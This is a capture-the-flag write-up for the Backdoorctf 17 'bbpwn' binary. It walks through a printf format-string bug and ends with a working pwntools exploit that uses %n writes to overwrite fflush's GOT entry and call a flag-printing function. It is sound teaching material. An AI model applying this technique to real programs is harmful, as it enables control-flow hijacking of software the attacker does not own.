# Backdoorctf 17 bbpwn

Let's take a look at the binary:

```
$    ./32_new
Hello baby pwner, whats your name?
guyinatuxedo
Ok cool, soon we will know whether you pwned it or not. Till then Bye guyinatuxedo
$    file 32_new
32_new: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.32, BuildID[sha1]=da5e14c668579652906e8dd34223b8b5aa3becf8, not stripped
$    pwn checksec 32_new
[*] '/Hackery/pod/modules/fmt_strings/backdoor17_bbpwn/32_new'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

So looking at this binary, when we run it it prompts us for input then prints it. We can see that it is a 32 bit binary with no PIE or RELRO. When we take a look at the main function in IDA, we see this:

```
void main(void)

{
  char name [200];
  char message [300];
 
  puts("Hello baby pwner, whats your name?");
  fflush(stdout);
  fgets(name,200,stdin);
  fflush(stdin);
  sprintf(message,"Ok cool, soon we will know whether you pwned it or not. Till then Bye %s",name);
  fflush(stdout);
  printf(message);
  fflush(stdout);
                    /* WARNING: Subroutine does not return */
  exit(1);
}
```

So we can see that it scans in our input using `fgets`, copies it and a message over to the `message` variable via sprintf. Then it prints the message using `printf`. The thing is, the way it's printing it is a bug. It's printing it without specifying what format string to use for it (like `%s`, `%x`, or `%p`). As a result, we can specify our own format which we will have it printed as. For example:

```
$    ./32_new
Hello baby pwner, whats your name?
%x.%x.%x.%x
Ok cool, soon we will know whether you pwned it or not. Till then Bye 8048914.ffab2f78.ffab2fcc.f7fa0289
```

We can see there that we have printed off values as four byte hex values. The thing that makes this really fun, is printf has a `%n` flag. This will write an integer to memory equal to the amount of bytes printed. With this due to the binary's setup we can get code execution. Since PIE isn't enabled we know the address of everything from the binary including the GOT table, which holds the addresses of libc function which are executed. Since RELRO is not enabled, we can write to this table. So we can use this bug to write to the GOT table so when it tries to call a function from libc, it will call something else. Looking at the code we see that `fflush` would be a good candidate since it is after the `printf` call.

Now let's figure out how to exploit this bug. First we need to see where our input ends up on the stack in reference to the format string bug. In order to do this, we will just give some input and see where it is with `%x` flags:

```
$    ./32_new
Hello baby pwner, whats your name?
000011112222.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
Ok cool, soon we will know whether you pwned it or not. Till then Bye 000011112222.8048914.ff8b05c8.ff8b061c.f7f7a289.38c.f7bee794.ff8b0874.f7f6a3d0.f7f7a73d.30303030.31313131.32323232.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825
$    ./32_new
Hello baby pwner, whats your name?
000011112222.%10$x.%11$x.%12$x
Ok cool, soon we will know whether you pwned it or not. Till then Bye 000011112222.30303030.31313131.32323232
```

So we can see that the offsets for our three four byte values are `10`, `11`, and `12`. Now the reason why these are four bytes is they will store an address that we are writing to, and since this is x86 addresses are four bytes. The reason why there are three of them, is we can only write a number equal to the amount of bytes printf has printed. So writing an entire address like `0x08048574` will cause us to print a huge amount of bytes, and really isn't realistic over a remote connection. So we can split it up into three smaller writes. Now the question is what function will we overwrite the GOT entry of `fflush` with. Looking through the list of functions, we see `flag` at `0x0804870b` looks like a good candidate (no arguments needed):

```

/* WARNING: Unknown calling convention yet parameter storage is locked */
/* flag() */

void flag(void)

{
  system("cat flag.txt");
  return;
}
```

If we call this function it will just print the flag. There is one more piece of this puzzle we need to figure out before we can write the exploit. With our write, we write the amount of bytes specified. We can increase the amount of bytes we print by `10` by including `%10x` in our format string. However once we do a write of `10`, all subsequent writes must be less than that. For our first write, we will worry about writing the first byte of the address to `flag` to the got entry for `fflush` which we can find using objdump:

```
$    objdump -R 32_new | grep fflush
0804a028 R_386_JUMP_SLOT   fflush@GLIBC_2.0
```

With the second write, we will write the second and third. The fourth write will write the highest byte of the address. However we will get around the fact that subsequent writes can only be greater than or equal to the previous write by overflowing the next spot in memory with it. So whatever value we write for the third write, only the least significant byte will end up in the highest byte for the got entry for `fflush`. To make more sense, let's look at the memory layout of the got entry while we carry out this attack. For that here's a small sample script which will carry out the attack and drop us in gdb to see:

```
#Import pwntools
from pwn import *

#Establish the target process, or network connection
target = process('./32_new')

#Attach gdb if it is a process
gdb.attach(target, gdbscript='b *0x080487dc')

#Print the first line of text
print target.recvline()

#Establish the addresses which we will be writing to
fflush_adr0 = p32(0x804a028)
fflush_adr1 = p32(0x804a029)
fflush_adr2 = p32(0x804a02b)

#Establish the necessary inputs for our input, so we can write to the addresses
fmt_string0 = "%10$n"
fmt_string1 = "%11$n"
fmt_string2 = "%12$n"

#Form the payload
payload = fflush_adr0 + fflush_adr1 + fflush_adr2 + fmt_string0 + fmt_string1 + fmt_string2

#Send the payload
target.sendline(payload)

#Drop to an interactive shell
target.interactive()
```

When we run the script and check the memory layout in gdb, we see this:

```
─────────────────────────────────────────────────────────────── code:x86:32 ────
    0x80487d0 <main+172>       lea    eax, [ebp-0x138]
    0x80487d6 <main+178>       push   eax
    0x80487d7 <main+179>       call   0x80485d0 <printf@plt>
 →  0x80487dc <main+184>       add    esp, 0x10
    0x80487df <main+187>       mov    eax, ds:0x804a044
    0x80487e4 <main+192>       sub    esp, 0xc
    0x80487e7 <main+195>       push   eax
    0x80487e8 <main+196>       call   0x80485c0 <fflush@plt>
    0x80487ed <main+201>       add    esp, 0x10
─────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "32_new", stopped, reason: BREAKPOINT
───────────────────────────────────────────────────────────────────── trace ────
[#0] 0x80487dc → main()
────────────────────────────────────────────────────────────────────────────────

Breakpoint 1, 0x080487dc in main ()
gef➤  x/2w 0x804a028
0x804a028:    0x52005252    0xf7000000
```

So we can see that the value the printf write by default is `0x52`. We need the first byte to be `0x0b` to match the `flag` function's address `0x0804870b`. We will just add `185` bytes to change the value to `0x10b` so the byte there will be `0x0b`. The `0x01` will overflow into the second byte, however that will be overwritten with the second write so we don't need to worry about it yet. When we append `%185x` to the first write and check the memory layout afterwards, we see this:

```
Breakpoint 1, 0x080487dc in main ()
gef➤  x/2x 0x0804a028
0x804a028:    0x0b010b0b    0xf7000001
```

So we can see that the first byte is `0x0b` which is what it should be. Now for the second write, we need the second and third byte to be equal to `0x0487`, and it is `0x010b`. So we need to add `0x0487 - 0x010b = 892` bytes to get it there. When we add `%892x` to the second write, we see that this is the new address that is written:

```
Breakpoint 1, 0x080487dc in main ()
gef➤  x/2x 0x0804a028
0x804a028:    0x8704870b    0xf7000004
```

So we can see that all of the bytes with the exception of the fourth byte are correct. Now we just need to add `(0x100 - 0x87) + 0x8 = 129` bytes to get the fourth byte equal to `0x08`. Of course this will spill over to the next dword (if you check the last couple of memory layouts, you can see it's value change as we overwrite part of it). However that value isn't used in anyway that would crash or prevent us from pulling this off, so we don't need to worry about it. When we add the final "bytes printed padding" (if you can call it that) we end up with this exploit:

```
#Import pwntools
from pwn import *

#Establish the target process, or network connection
target = process('./32_new')
#target = remote('163.172.176.29', 9035)

#Attach gdb if it is a process
#gdb.attach(target, gdbscript='b *0x080487dc')

#Print the first line of text
print target.recvline()

#Prompt for input, to pause for gdb
#raw_input()

#Establish the addresses which we will be writing to
fflush_adr0 = p32(0x804a028)
fflush_adr1 = p32(0x804a029)
fflush_adr2 = p32(0x804a02b)

#Establish the amount of bytes needed to be printed in order to write correct value
flag_val0 = "%185x"
flag_val1 = "%892x"
flag_val2 = "%129x"

#Establish the necessary inputs for our input, so we can write to the addresses
fmt_string0 = "%10$n"
fmt_string1 = "%11$n"
fmt_string2 = "%12$n"

#Form the payload
payload = fflush_adr0 + fflush_adr1 + fflush_adr2 + flag_val0 + fmt_string0 + flag_val1 + fmt_string1 + flag_val2 + fmt_string2

#Send the payload
target.sendline(payload)

#Drop to an interactive shell
target.interactive()
```

When we run it:

```
$    python exploit.py
[+] Starting local process './32_new': pid 31622
Hello baby pwner, whats your name?

[*] Switching to interactive mode
Ok cool, soon we will know whether you pwned it or not. Till then Bye (\xa0\x0)\xa0\x0+\xa0\x0                                                                                                                                                                                  8048914                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    ffaa8f08                                                                                                                         ffaa8f5c
[*] Process './32_new' stopped with exit code 1 (pid 31622)
flag{g0ttem_b0yz}
[*] Got EOF while reading in interactive
```

Just like that, we solved the challenge!
